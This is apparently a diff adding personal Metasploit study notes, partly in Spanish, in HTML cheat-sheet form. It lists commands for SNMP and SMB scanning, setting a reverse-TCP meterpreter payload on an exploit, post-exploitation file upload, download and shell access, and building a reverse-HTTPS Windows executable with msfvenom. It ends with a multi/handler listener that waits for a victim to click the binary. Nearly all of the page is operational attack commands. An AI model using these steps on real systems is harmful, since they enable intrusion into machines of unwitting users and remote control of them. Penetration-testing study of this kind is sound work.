@@ -1,0 +1,105 @@
+<h1 id="metasploit">METASPLOIT</h1>
+<hr />
+
+<h2 id="setup">setup</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali: service postgresql start
+root@kali: service metasploit start
+root@kali: msfconsole
+
+</code></pre></div></div>
+
+<h2 id="auxiliar-modules">auxiliar modules</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; show auxiliary  &lt;-nos muestra lista
+msf&gt; search snmp
+...
+...
+msf&gt; use auxiliary/scanner/snmp/snmp_enum
+msf  auxiliary&gt; info
+...
+...
+msf auxiliary&gt; show options
+msf auxiliary&gt; set RHOST 192.168.58.10-20
+msf auxiliary&gt; SET THREADS 10
+msf auxiliary&gt; run
+</code></pre></div></div>
+
+<h2 id="smb-auxiliary">smb auxiliary</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   msf &gt; use /../smb_version
+   msf (smb_version)&gt; show options
+   msf (smb_version)&gt; set RHOST 10.10.0.10-20
+   msf (smb_version)&gt; set  THREADS 10
+   msf (smb_version)&gt; run
+</code></pre></div></div>
+
+<h1 id="payloads">PAYLOADS</h1>
+<hr />
+<h2 id="stage-and-non-stage-payload">stage and non stage payload</h2>
+
+<p>stage: send in 2 parts  <br />
+nonstage: 1 payload to rule them all</p>
+
+<h2 id="stage-payload-meterpreter">STAGE PAYLOAD (meterpreter)</h2>
+
+<p>basics</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(seattlelab)&gt;set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(seattlelab)&gt; show options
+msf exploit(seattlelab)&gt; exploit
+....
+meterpreter&gt; help
+...
+meterpreter&gt;sysinfo
+...
+meterpreter&gt;getuid
+...
+meterpreter&gt;search
+...
+</code></pre></div></div>
+
+<p>uploading a file</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  meterpreter&gt; upload /usr/share/../nc.exe c:\\Users\\Offsec
+</code></pre></div></div>
+
+<p>downloading</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  meterpreter&gt; download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
+</code></pre></div></div>
+<p>Shell</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  meterpreter&gt; shell
+  ...
+  c:\&gt;
+</code></pre></div></div>
+<p>exit</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  c:\&gt; exit
+  meterpreter&gt; exit -y
+  msf(saras)&gt; back
+  msf &gt;
+</code></pre></div></div>
+<h2 id="additional-payloads">Additional payloads</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  msf&gt; use windows/meterpreter/reverse_https
+  msf payload(revers_https) &gt; info
+  ...
+  msf &gt; use windows/meterpreter/reverse_tcp_allports
+  msf payload(reverse_tcp_allports)&gt; info
+</code></pre></div></div>
+
+<h2 id="generate-a-binary-payload">Generate a binary payload</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   msf&gt; msfvenom -l &lt;lista todos los payloads
+</code></pre></div></div>
+<p>we chose one ex: windows/meterpreter/reverse_https</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   msf&gt; msfvenom -p &lt;payload ej reverse&gt;  LHOST=&lt;kali&gt; LPORT=&lt;PORT&gt; -f exe --platform windows -a x86 &gt; /var/www/reverse_met_https.exe
+</code></pre></div></div>
+
+<h2 id="multihandler">multihandler</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   root@kali: msfconsole
+   msf &gt;  use exploit/multi/handler
+   msf exploit&gt; set PAYLOAD windows/meterpreter/reverse_http (mismo que el binario)
+   msf exploit&gt; show options
+   ....
+   msf exploit&gt; set LHOST &lt; ip &gt;
+   msf exploit&gt; set LPORT &lt;port&gt;
+   msf exploit&gt; exploit
+   ...
+   escuchando en 443
+   ... cuando hagan click
+   meterpreter&gt; :)
+</code></pre></div></div>
